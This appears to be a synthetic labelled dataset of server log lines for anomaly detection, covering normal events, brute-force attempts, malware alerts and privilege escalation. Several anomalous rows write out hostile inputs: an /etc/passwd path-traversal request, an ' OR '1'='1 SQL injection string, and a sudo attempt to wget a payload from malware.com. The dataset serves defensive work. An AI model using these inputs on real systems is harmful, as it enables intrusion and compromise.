timestamp,log_message,label,anomaly_type
2026-01-04 17:11:10,session opened for user user by (uid=0),0,normal
2026-01-04 17:11:24,[INFO] Request processed in 1450ms,0,normal
2026-01-04 17:11:32,ALERT: Suspicious process detected: reverse_shell (PID: 32629),1,malware_indicator
2026-01-04 17:11:37,"192.168.16.14 - - [04/Jan/2026:07:20:05 +0700] ""POST /index.html HTTP/1.1"" 200 34587",0,normal
2026-01-04 17:11:38,session closed for user root,0,normal
2026-01-04 17:12:07,"192.168.214.117 - - [04/Jan/2026:12:51:15 +0700] ""GET /index.html HTTP/1.1"" 200 6282",0,normal
2026-01-04 17:12:11,[INFO] Application started successfully,0,normal
2026-01-04 17:12:14,[INFO] Request processed in 1911ms,0,normal
2026-01-04 17:12:26,kernel: BUG: soft lockup - CPU#3 stuck for 2335s!,1,system_error
2026-01-04 17:12:38,session closed for user nginx,0,normal
2026-01-04 17:12:45,[INFO] User mysql logged in successfully,0,normal
2026-01-04 17:12:48,[DEBUG] Processing request from 192.168.45.181,0,normal
2026-01-04 17:13:21,systemd[1]: Stopped redis.service,0,normal
2026-01-04 17:13:31,[INFO] User postgres logged in successfully,0,normal
2026-01-04 17:13:44,[ERROR] Disk space critical: / at 92% usage,1,system_error
2026-01-04 17:13:48,session opened for user apache by (uid=0),0,normal
2026-01-04 17:13:49,MySQL server started with process id 34713,0,normal
2026-01-04 17:13:52,Accepted password for postgres from 192.168.193.19 port 42448 ssh2,0,normal
2026-01-04 17:14:02,[DEBUG] Processing request from 192.168.8.127,0,normal
2026-01-04 17:14:05,kernel: [917.874162] br-0: link down,0,normal
2026-01-04 17:14:25,[INFO] Cache hit for key: cache_key_330,0,normal
2026-01-04 17:14:45,[INFO] Request processed in 4644ms,0,normal
2026-01-04 17:14:55,systemd[1]: Started redis.service,0,normal
2026-01-04 17:14:56,MySQL server started with process id 45869,0,normal
2026-01-04 17:15:02,"192.168.113.224 - - [04/Jan/2026:16:10:39 +0700] ""POST /admin HTTP/1.1"" 200 6550",0,normal
2026-01-04 17:15:10,[INFO] Cache hit for key: cache_key_154,0,normal
2026-01-04 17:15:13,systemd[1]: Stopped docker.service,0,normal
2026-01-04 17:15:19,Connection received: host=192.168.88.102 user=mysql database=test,0,normal
2026-01-04 17:15:26,session closed for user www-data,0,normal
2026-01-04 17:15:27,systemd[1]: Stopped apache2.service,0,normal
2026-01-04 17:15:28,kernel: [138.289110] wlan0: link down,0,normal
2026-01-04 17:15:38,Connection received: host=192.168.141.144 user=nginx database=analytics,0,normal
2026-01-04 17:16:02,[INFO] Cache hit for key: cache_key_607,0,normal
2026-01-04 17:16:03,systemd[1]: Starting ssh.service...,0,normal
2026-01-04 17:16:48,Accepted password for mysql from 192.168.23.105 port 31433 ssh2,0,normal
2026-01-04 17:16:49,Received disconnect from 192.168.245.77 port 3061:11: disconnected by user,0,normal
2026-01-04 17:16:50,[INFO] Request processed in 4451ms,0,normal
2026-01-04 17:17:15,[INFO] User www-data logged in successfully,0,normal
2026-01-04 17:17:22,ALERT: Rootkit signature detected in /dashboard,1,malware_indicator
2026-01-04 17:17:22,systemd[1]: Started apache2.service,0,normal
2026-01-04 17:17:29,Accepted password for root from 192.168.108.228 port 61850 ssh2,0,normal
2026-01-04 17:17:33,Connection received: host=192.168.98.96 user=nginx database=production,0,normal
2026-01-04 17:17:35,systemd[1]: Started apache2.service,0,normal
2026-01-04 17:17:43,"192.168.64.167 - - [04/Jan/2026:07:37:52 +0700] ""POST /dashboard HTTP/1.1"" 200 29893",0,normal
2026-01-04 17:17:44,kernel: [959.729737] eth1: link up,0,normal
2026-01-04 17:17:49,[INFO] Application started successfully,0,normal
2026-01-04 17:18:05,Accepted password for postgres from 192.168.28.24 port 50268 ssh2,0,normal
2026-01-04 17:18:07,[INFO] User user logged in successfully,0,normal
2026-01-04 17:18:10,"104.248.204.25 - - [04/Jan/2026:14:56:44 +0700] ""GET /../../../etc/passwd HTTP/1.1"" 400 9232",1,suspicious_network
2026-01-04 17:18:17,systemd[1]: Starting mongodb.service...,0,normal
2026-01-04 17:18:32,Accepted password for nginx from 192.168.211.106 port 60104 ssh2,0,normal
2026-01-04 17:18:46,systemd[1]: Started redis.service,0,normal
2026-01-04 17:18:46,[INFO] Cache hit for key: cache_key_314,0,normal
2026-01-04 17:18:54,kernel: [703.422066] eth1: link up,0,normal
2026-01-04 17:18:55,[INFO] Request processed in 3240ms,0,normal
2026-01-04 17:19:07,"192.168.246.242 - - [04/Jan/2026:11:06:10 +0700] ""GET /api/v1/data HTTP/1.1"" 304 0",0,normal
2026-01-04 17:19:28,MySQL server started with process id 22336,0,normal
2026-01-04 17:19:34,"104.248.81.104 - - [04/Jan/2026:12:27:52 +0700] ""POST /login HTTP/1.1"" 401 47432",1,suspicious_network
2026-01-04 17:19:39,[INFO] User www-data logged in successfully,0,normal
2026-01-04 17:20:34,systemd[1]: Starting mysql.service...,0,normal
2026-01-04 17:20:37,authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=104.248.226.57,1,brute_force
2026-01-04 17:20:54,session closed for user user,0,normal
2026-01-04 17:21:06,[INFO] Application started successfully,0,normal
2026-01-04 17:21:18,"192.168.213.184 - - [04/Jan/2026:18:59:19 +0700] ""POST /index.html HTTP/1.1"" 200 38150",0,normal
2026-01-04 17:21:18,Possible SQL injection attack from 192.42.46.232: ' OR '1'='1,1,suspicious_network
2026-01-04 17:21:32,systemd[1]: Starting docker.service...,0,normal
2026-01-04 17:21:42,[DEBUG] Processing request from 192.168.189.220,0,normal
2026-01-04 17:21:53,session closed for user postgres,0,normal
2026-01-04 17:22:03,session opened for user www-data by (uid=0),0,normal
2026-01-04 17:22:15,Received disconnect from 192.168.20.46 port 25494:11: disconnected by user,0,normal
2026-01-04 17:22:18,"192.168.103.198 - - [04/Jan/2026:00:41:57 +0700] ""POST /dashboard HTTP/1.1"" 200 25911",0,normal
2026-01-04 17:22:34,Received disconnect from 192.168.169.154 port 40749:11: disconnected by user,0,normal
2026-01-04 17:22:34,[DEBUG] Processing request from 192.168.240.130,0,normal
2026-01-04 17:22:35,kernel: [365.441198] docker0: link up,0,normal
2026-01-04 17:22:53,systemd[1]: ssh.service failed,1,system_error
2026-01-04 17:23:03,"192.168.115.79 - - [04/Jan/2026:06:33:00 +0700] ""GET /api/v1/users HTTP/1.1"" 200 14129",0,normal
2026-01-04 17:23:07,"192.168.17.5 - - [03/Jan/2026:22:58:19 +0700] ""GET /api/v1/data HTTP/1.1"" 304 0",0,normal
2026-01-04 17:23:08,authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.42.46.180,1,brute_force
2026-01-04 17:23:16,Connection received: host=192.168.34.9 user=mysql database=analytics,0,normal
2026-01-04 17:23:31,[INFO] User www-data logged in successfully,0,normal
2026-01-04 17:24:01,kernel: [33.489721] br-0: link down,0,normal
2026-01-04 17:24:02,systemd[1]: Starting mysql.service...,0,normal
2026-01-04 17:24:13,MySQL server started with process id 9725,0,normal
2026-01-04 17:24:26,[INFO] Application started successfully,0,normal
2026-01-04 17:24:37,[INFO] User root logged in successfully,0,normal
2026-01-04 17:24:41,session closed for user mysql,0,normal
2026-01-04 17:24:42,systemd[1]: Stopped mongodb.service,0,normal
2026-01-04 17:25:06,kernel: [451.708059] eth1: link up,0,normal
2026-01-04 17:25:10,Accepted password for mysql from 192.168.91.112 port 32415 ssh2,0,normal
2026-01-04 17:25:15,"192.168.1.253 - - [04/Jan/2026:17:43:25 +0700] ""GET /login HTTP/1.1"" 200 49696",0,normal
2026-01-04 17:25:23,[DEBUG] Processing request from 192.168.162.33,0,normal
2026-01-04 17:25:48,systemd[1]: Starting nginx.service...,0,normal
2026-01-04 17:25:48,systemd[1]: Stopped docker.service,0,normal
2026-01-04 17:25:49,session closed for user root,0,normal
2026-01-04 17:25:52,session opened for user postgres by (uid=0),0,normal
2026-01-04 17:25:53,MySQL server started with process id 24095,0,normal
2026-01-04 17:25:57,systemd[1]: Stopped nginx.service,0,normal
2026-01-04 17:25:59,[INFO] User www-data logged in successfully,0,normal
2026-01-04 17:26:01,kernel: [992.144364] wlan0: link down,0,normal
2026-01-04 17:26:06,Received disconnect from 192.168.197.10 port 11143:11: disconnected by user,0,normal
2026-01-04 17:26:09,[INFO] Cache hit for key: cache_key_494,0,normal
2026-01-04 17:26:39,MySQL server started with process id 28269,0,normal
2026-01-04 17:26:48,session closed for user apache,0,normal
2026-01-04 17:27:10,[INFO] Application started successfully,0,normal
2026-01-04 17:27:23,[INFO] User user logged in successfully,0,normal
2026-01-04 17:27:35,session opened for user guest by (uid=0),0,normal
2026-01-04 17:27:46,[INFO] Request processed in 192ms,0,normal
2026-01-04 17:28:01,Accepted password for user from 192.168.150.22 port 2213 ssh2,0,normal
2026-01-04 17:28:09,[INFO] Application started successfully,0,normal
2026-01-04 17:28:22,Connection received: host=192.168.37.213 user=nginx database=users,0,normal
2026-01-04 17:28:27,[INFO] Cache hit for key: cache_key_535,0,normal
2026-01-04 17:28:33,[DEBUG] Processing request from 192.168.153.206,0,normal
2026-01-04 17:28:34,[INFO] Cache hit for key: cache_key_727,0,normal
2026-01-04 17:28:47,Accepted password for mysql from 192.168.78.141 port 19935 ssh2,0,normal
2026-01-04 17:28:52,[INFO] Cache hit for key: cache_key_930,0,normal
2026-01-04 17:29:02,[INFO] Application started successfully,0,normal
2026-01-04 17:29:09,[INFO] Cache hit for key: cache_key_291,0,normal
2026-01-04 17:29:25,systemd[1]: Stopped cron.service,0,normal
2026-01-04 17:29:28,systemd[1]: Started ssh.service,0,normal
2026-01-04 17:29:52,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 17:29:53,kernel: [263.129837] br-0: link up,0,normal
2026-01-04 17:29:59,session opened for user admin by (uid=0),0,normal
2026-01-04 17:30:01,Received disconnect from 192.168.179.211 port 40128:11: disconnected by user,0,normal
2026-01-04 17:30:15,[INFO] Cache hit for key: cache_key_642,0,normal
2026-01-04 17:30:27,[DEBUG] Processing request from 192.168.109.143,0,normal
2026-01-04 17:30:42,"192.168.54.46 - - [04/Jan/2026:12:16:00 +0700] ""GET /api/v1/users HTTP/1.1"" 304 0",0,normal
2026-01-04 17:30:46,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 17:30:48,systemd[1]: Started postgresql.service,0,normal
2026-01-04 17:31:00,[INFO] Application started successfully,0,normal
2026-01-04 17:31:06,"192.168.228.103 - - [04/Jan/2026:12:20:22 +0700] ""GET /images/logo.png HTTP/1.1"" 304 0",0,normal
2026-01-04 17:31:14,systemd[1]: Stopped ssh.service,0,normal
2026-01-04 17:31:22,[INFO] Cache hit for key: cache_key_217,0,normal
2026-01-04 17:31:25,"192.168.87.110 - - [04/Jan/2026:13:38:26 +0700] ""POST /api/v1/data HTTP/1.1"" 200 36354",0,normal
2026-01-04 17:31:31,[DEBUG] Processing request from 192.168.187.68,0,normal
2026-01-04 17:31:33,error: maximum authentication attempts exceeded for admin from 45.33.232.154,1,brute_force
2026-01-04 17:31:35,systemd[1]: postgresql.service failed,1,system_error
2026-01-04 17:31:37,Received disconnect from 192.168.140.219 port 27842:11: disconnected by user,0,normal
2026-01-04 17:31:39,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 17:31:43,systemd[1]: Started cron.service,0,normal
2026-01-04 17:31:45,[DEBUG] Processing request from 192.168.110.153,0,normal
2026-01-04 17:32:11,kernel: [917.128112] docker0: link up,0,normal
2026-01-04 17:32:29,[INFO] Cache hit for key: cache_key_502,0,normal
2026-01-04 17:32:39,kernel: [632.235029] docker0: link up,0,normal
2026-01-04 17:32:49,"192.168.18.122 - - [04/Jan/2026:04:22:06 +0700] ""GET /dashboard HTTP/1.1"" 304 0",0,normal
2026-01-04 17:33:07,Accepted password for admin from 192.168.7.220 port 34382 ssh2,0,normal
2026-01-04 17:33:09,"192.168.240.58 - - [04/Jan/2026:06:16:11 +0700] ""GET /api/v1/users HTTP/1.1"" 304 0",0,normal
2026-01-04 17:33:11,"192.168.96.166 - - [03/Jan/2026:23:47:31 +0700] ""GET /static/js/app.js HTTP/1.1"" 200 14617",0,normal
2026-01-04 17:33:13,[INFO] Request processed in 734ms,0,normal
2026-01-04 17:33:24,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 17:33:31,Connection received: host=192.168.111.56 user=mysql database=users,0,normal
2026-01-04 17:33:42,mysql: user NOT in sudoers; TTY=pts/0; PWD=/home/mysql; USER=root; COMMAND=/bin/bash,1,privilege_escalation
2026-01-04 17:33:43,session closed for user guest,0,normal
2026-01-04 17:33:57,systemd[1]: Started redis.service,0,normal
2026-01-04 17:34:06,[INFO] Cache hit for key: cache_key_425,0,normal
2026-01-04 17:34:11,Received disconnect from 192.168.72.99 port 59820:11: disconnected by user,0,normal
2026-01-04 17:34:13,[ERROR] Memory allocation failed for request from 192.42.25.141,1,system_error
2026-01-04 17:34:39,[INFO] User user logged in successfully,0,normal
2026-01-04 17:34:39,systemd[1]: Stopped redis.service,0,normal
2026-01-04 17:35:07,systemd[1]: Started ssh.service,0,normal
2026-01-04 17:35:25,session opened for user guest by (uid=0),0,normal
2026-01-04 17:35:25,"192.168.207.68 - - [04/Jan/2026:10:52:36 +0700] ""GET /api/v1/data HTTP/1.1"" 304 0",0,normal
2026-01-04 17:35:34,systemd[1]: Stopped mysql.service,0,normal
2026-01-04 17:35:38,systemd[1]: Stopped cron.service,0,normal
2026-01-04 17:35:48,systemd[1]: Starting redis.service...,0,normal
2026-01-04 17:35:54,authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.19.199,1,brute_force
2026-01-04 17:36:00,[INFO] User www-data logged in successfully,0,normal
2026-01-04 17:36:05,systemd[1]: Started ssh.service,0,normal
2026-01-04 17:36:06,"192.168.123.38 - - [04/Jan/2026:10:28:05 +0700] ""GET /css/style.css HTTP/1.1"" 200 4967",0,normal
2026-01-04 17:36:16,Received disconnect from 192.168.79.103 port 15750:11: disconnected by user,0,normal
2026-01-04 17:36:28,systemd[1]: Starting cron.service...,0,normal
2026-01-04 17:36:35,systemd[1]: Starting nginx.service...,0,normal
2026-01-04 17:36:49,[DEBUG] Processing request from 192.168.202.150,0,normal
2026-01-04 17:36:58,[INFO] Request processed in 3029ms,0,normal
2026-01-04 17:37:00,[INFO] Application started successfully,0,normal
2026-01-04 17:37:09,[INFO] Cache hit for key: cache_key_391,0,normal
2026-01-04 17:37:18,Accepted password for www-data from 192.168.120.187 port 47137 ssh2,0,normal
2026-01-04 17:37:28,MySQL server started with process id 56763,0,normal
2026-01-04 17:37:39,DDoS attack detected from 192.42.184.189 - rate limit exceeded,1,suspicious_network
2026-01-04 17:37:43,session closed for user guest,0,normal
2026-01-04 17:38:00,kernel: [702.618491] br-0: link down,0,normal
2026-01-04 17:38:06,session opened for user apache by (uid=0),0,normal
2026-01-04 17:38:06,MySQL server started with process id 17123,0,normal
2026-01-04 17:38:11,session closed for user guest,0,normal
2026-01-04 17:38:21,"192.168.233.132 - - [04/Jan/2026:21:10:23 +0700] ""GET /static/js/app.js HTTP/1.1"" 304 0",0,normal
2026-01-04 17:38:23,[CRITICAL] Database connection pool exhausted,1,system_error
2026-01-04 17:38:32,systemd[1]: Starting apache2.service...,0,normal
2026-01-04 17:38:35,systemd[1]: Started mysql.service,0,normal
2026-01-04 17:38:41,PAM: Authentication failure for apache from 192.42.250.19,1,brute_force
2026-01-04 17:38:57,Accepted password for apache from 192.168.220.225 port 34117 ssh2,0,normal
2026-01-04 17:39:08,[DEBUG] Processing request from 192.168.36.83,0,normal
2026-01-04 17:39:16,[INFO] Cache hit for key: cache_key_162,0,normal
2026-01-04 17:39:19,"192.168.63.237 - - [04/Jan/2026:11:16:04 +0700] ""GET /images/logo.png HTTP/1.1"" 304 0",0,normal
2026-01-04 17:39:19,"192.168.8.199 - - [04/Jan/2026:21:48:47 +0700] ""GET /css/style.css HTTP/1.1"" 304 0",0,normal
2026-01-04 17:39:19,"192.168.123.104 - - [04/Jan/2026:08:38:13 +0700] ""POST /images/logo.png HTTP/1.1"" 200 6827",0,normal
2026-01-04 17:39:25,[DEBUG] Processing request from 192.168.209.147,0,normal
2026-01-04 17:39:34,"192.168.206.111 - - [04/Jan/2026:05:49:56 +0700] ""GET /api/v1/users HTTP/1.1"" 200 23630",0,normal
2026-01-04 17:39:35,[INFO] Application started successfully,0,normal
2026-01-04 17:39:36,[INFO] User postgres logged in successfully,0,normal
2026-01-04 17:39:45,systemd[1]: Stopped postgresql.service,0,normal
2026-01-04 17:39:58,sudo: mysql : command not allowed ; TTY=pts/0 ; USER=root ; COMMAND=wget http://malware.com/payload,1,privilege_escalation
2026-01-04 17:39:59,"192.168.203.176 - - [04/Jan/2026:15:07:09 +0700] ""POST /api/v1/data HTTP/1.1"" 200 3689",0,normal
2026-01-04 17:40:05,[INFO] Request processed in 2963ms,0,normal
2026-01-04 17:40:06,[DEBUG] Processing request from 192.168.9.36,0,normal
2026-01-04 17:40:20,session closed for user postgres,0,normal
2026-01-04 17:40:44,kernel: [449.652317] wlan0: link down,0,normal
2026-01-04 17:40:53,[INFO] Cache hit for key: cache_key_343,0,normal
2026-01-04 17:41:02,systemd[1]: Started mysql.service,0,normal
2026-01-04 17:41:12,[INFO] Request processed in 4513ms,0,normal
2026-01-04 17:41:24,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 17:41:24,session opened for user root by (uid=0),0,normal
2026-01-04 17:41:27,kernel: [900.830752] wlan0: link down,0,normal
2026-01-04 17:41:31,systemd[1]: Stopped docker.service,0,normal
2026-01-04 17:41:37,"192.168.47.20 - - [04/Jan/2026:21:34:12 +0700] ""GET /login HTTP/1.1"" 200 48756",0,normal
2026-01-04 17:41:47,"192.168.188.148 - - [04/Jan/2026:09:02:18 +0700] ""GET /dashboard HTTP/1.1"" 304 0",0,normal
2026-01-04 17:42:06,"192.168.29.3 - - [04/Jan/2026:19:28:04 +0700] ""GET /admin HTTP/1.1"" 304 0",0,normal
2026-01-04 17:42:15,kernel: [107.771029] wlan0: link up,0,normal
2026-01-04 17:42:19,Connection received: host=192.168.16.25 user=postgres database=test,0,normal
